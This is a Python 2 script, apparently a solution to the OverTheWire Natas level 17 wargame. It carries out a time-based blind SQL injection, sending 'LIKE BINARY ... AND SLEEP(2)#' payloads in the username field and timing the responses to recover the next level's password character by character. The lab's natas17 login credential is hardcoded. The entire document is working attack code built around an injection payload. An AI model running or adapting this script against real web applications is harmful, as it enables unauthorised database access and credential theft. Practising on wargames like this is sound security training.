import requests
import string
import time


allChars = string.ascii_letters+string.digits
dictChars = ""
passL = 32
passw = ""

print "Recovering all possible chars ..."
for c in allChars:
    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),data={'username':'natas18" AND password LIKE BINARY "%'+c+'%" AND SLEEP(2)#'})
    if r.elapsed.seconds >= 2:
        dictChars += c
        print dictChars
print "=> all possible chars :",dictChars

for i in range(passL):
    for c in dictChars:
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),data={'username':'natas18" AND password LIKE BINARY "'+passw+c+'%" AND SLEEP(2)#'})
        if r.elapsed.seconds >= 2:
            passw += c
            print "Success :",passw
            break

print "=> password is :",passw           
         